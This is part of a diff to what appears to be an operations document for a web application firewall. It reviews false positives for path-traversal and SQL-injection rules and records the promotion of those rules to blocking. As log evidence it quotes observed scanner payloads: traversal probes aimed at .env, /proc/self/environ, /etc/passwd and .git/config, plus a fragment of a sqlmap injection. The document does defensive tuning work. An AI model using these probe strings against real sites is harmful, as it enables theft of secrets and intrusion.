-> on titan / rigel / orion / earth / mars / virgo via `waf_rule_detail` and
-> `waf_activity` (per country, per node):
-> - **11 507 hits**, ~2 300 distinct source IPs; per host: earth 4 510, orion
->   2 421, titan 1 740, mars 1 361, virgo 1 214, rigel 261.
-> - **0 hits from Greece on every node** (`waf_activity country=GR` fan-out) —
->   the customer population never trips it.
-> - Sources: Google Cloud (US/TW/NL/JP/BE/SG regions) is >95 % of every node,
->   and a 200-row earth sample was **200/200 scanner payloads** — Vite
->   `/@fs/..%252f…/root/.env?raw??` (80), `/@fs/..%252f…/proc/self/environ`
->   (32), Astro `/_image?href=/../../../.env` (27), `/assets../.env` and the
->   `/static../`, `/img../`, `/uploads../` variants (168/200 target `.env`).
->   Every minority-country row was pulled and read: Vodafone Qatar `pearcmd` /
->   `/etc/passwd%00` sweep, Techoff `..%5c…var/log/apache2/access.log`,
->   DataWagon LumiaBot `.env` + `/proc/self/environ`, Bucklog `curl`
->   `/static../var/www/html/.env`, a fake Applebot-Extended on Cloudflare
->   (`/@fs/..%252f`), Turk Telekom GitConfigScanner `/js../.git/config`,
->   `libredtail-http` pearcmd RCE, a FortiGate CVE-2018-13379 probe, an AWS
->   credentials probe. **0 FP.**
-> - Half the hits land on panel subdomains (`cpanel.* webmail.* whm.*
->   webdisk.* autodiscover.*`) and the bare server IPs — those are web-edge
->   vhosts that proxy nothing but the scanner's 404s.
-> - **Panel ports** (`:2083/:2087/:2096`, `cfm_panel.lua`): the panel gate runs
->   the same ruleset and enforces **block-tier hits only** under the default
->   `PANEL_WAF_MODE = enforce`, so this promotion also turns traversal from
->   `logonly=would_challenge` into a deny there. The `waf_rule_detail` panel
->   section for the same 7 days: **0 hits on all six servers** (scanner and
->   non-scanner), so nothing cPanel / WHM / Roundcube does legitimately trips
->   `detect_traversal`; `waf_fp_hunt` is the panel-side watch after release.
->
-> **Promoted `challenge` → `block`** (Lua default + Go registry; the panel
-> gate therefore denies too — see above). The
-> `WAF_TRAVERSAL` autoblock family is **held at 0** through its own burn-in
-> (`TRAVERSAL = 0` in `detectors.conf`, held in code): at threshold 1 the
-> volume above is ~330 six-hour bans and alerts a day, which the operator arms
-> deliberately with `TRAVERSAL = 1` (`DRY_RUN = 1` to preview). Operators who
-> pinned `rule_traversal` to a string mode in `/etc/cfm/*` keep their setting;
-> a legacy boolean `rule_traversal = true` pin means "enabled at the built-in
-> tier" and follows the new default, i.e. it now blocks. An operator who keeps
-> `rule_traversal = "challenge"` also sees an attribution shift: a request that
-> trips traversal *and* an earlier challenge-tier rule is now logged, pushed and
-> counted under that other rule (first recorded hit wins among equal severity),
-> where before it was `WAF_TRAVERSAL` / rule 101.
->
-> ### ✅ FP review — DONE 2026-07 (promoted)
-> A 6-server `cfm.waf.log` review (titan, virgo, orion, rigel, earth, mars)
-> found the two SQLi families **100% clean**:
-> - `WAF_SQLI` (301): **24 hits, 24/24 true positives, 0 FP** — time-based
->   (`SLEEP`), union, and error-based SQLi against WP plugins (ays_sccp),
->   PrestaShop CommentGrade, Fuel CMS, and a custom login, from repeat-offender
->   scanners. **Promoted `challenge` → `block`.**
-> - `WAF_SQLI_LEXICAL` (309): **188 hits, 188/188 true positives, 0 FP** —
->   dominated by a **distributed error-based sqlmap campaign** against one host
->   (`extractvalue(…CONCAT(0x7e…ELT…FLOOR(RAND()))` with case-randomization +
->   `/**/` evasion) that the DBMS-unique tier-1 would have missed entirely.
->   No legitimate app tripped a word-colliding token. **Promoted `logonly` →
->   `challenge`.**
-> - `WAF_SUPERGLOBAL` (318): **0 hits** on all six — no data either way, **kept
->   `logonly`.**
->
-> **Residual risk noted:** `WAF_SQLI_LEXICAL` at `challenge` on an `admin-ajax`
-> **POST** could break a legit plugin whose XHR body carries a word-colliding
-> token (a `fetch()` can't solve the challenge). Zero such cases in the review;
-> if one ever appears, drop rule 309 for that vhost via the per-vhost exclusion
-> mechanism, or trim the offending token from `SQLI_LEXICAL_TOKENS`.
->
-> **Re-run this pass** (still the way to review any WAF family): grep
-> `cfm.waf.log` per reason, group by `host`+`uri`, classify each as a
-> legitimate app (FP) vs an attack (TP); promote only on a clean window.
+### FP review — rule 101 (`WAF_TRAVERSAL`), 2026-09-05
+
+Six servers, 7 days: **11 507 hits**, ~2 300 IPs, **0 from Greece**, >95 %
+Google Cloud; a 200-row sample was 200/200 scanner payloads (Vite
+`/@fs/..%252f…/.env`, Astro `/_image?href=/../../../.env`; 168/200 target
+`.env`), and every minority-country row was a scanner too. **0 FP.** The panel
+ports enforce block-tier hits only (`PANEL_WAF_MODE = enforce`), so the
+promotion denies there too; their section showed 0 hits (`waf_fp_hunt` is the
+panel-side watch).
+
+**Decision:** 101 promoted `challenge` → `block`. The `WAF_TRAVERSAL`
+autoblock family is **held at 0** (`TRAVERSAL = 0`, in code and
+`detectors.conf`): at threshold 1 this volume is ~330 six-hour bans and alerts
+a day; arming is the operator's `TRAVERSAL = 1` (`DRY_RUN = 1` to preview). A
+string-mode pin of `rule_traversal` in `/etc/cfm/*` is kept; a legacy boolean
+`rule_traversal = true` follows the new default (blocks). With
+`rule_traversal = "challenge"`, a request that also trips an earlier
+challenge-tier rule is logged under that rule (first hit wins among equals).
+
+### FP review — SQLi families, 2026-07
+
+Six servers, `cfm.waf.log`:
+- `WAF_SQLI` (301): 24 hits, 24/24 true positives (time-based, union and
+  error-based SQLi against WP plugins, PrestaShop, Fuel CMS, a custom login).
+  Promoted `challenge` → `block`.
+- `WAF_SQLI_LEXICAL` (309): 188 hits, 188/188 true positives, dominated by a
+  distributed error-based sqlmap campaign (`extractvalue(…CONCAT(0x7e…ELT…FLOOR(RAND()))`
+  with case randomisation and `/**/`) that 301's DBMS-unique tier would have
+  missed. Promoted `logonly` → `challenge`, then `block` on 2026-08-23 after a
+  wider fleet burn-in.
+- `WAF_SUPERGLOBAL` (318): 0 hits then; now `challenge_v2` (a WHMCS logout
+  probe was the only 30-day hit).
+
+**Residual risk:** 309 on an `admin-ajax` **POST** could break a plugin whose
+XHR body carries a word-colliding token. None seen; if one appears, exclude
+309 for that vhost or trim the token from `SQLI_LEXICAL_TOKENS`.
+
+**Re-run this pass** for any family: grep `cfm.waf.log` per reason, group by
+`host`+`uri`, classify each as legitimate app (FP) or attack (TP); promote
+only on a clean window.
 
 ## Known gaps
 
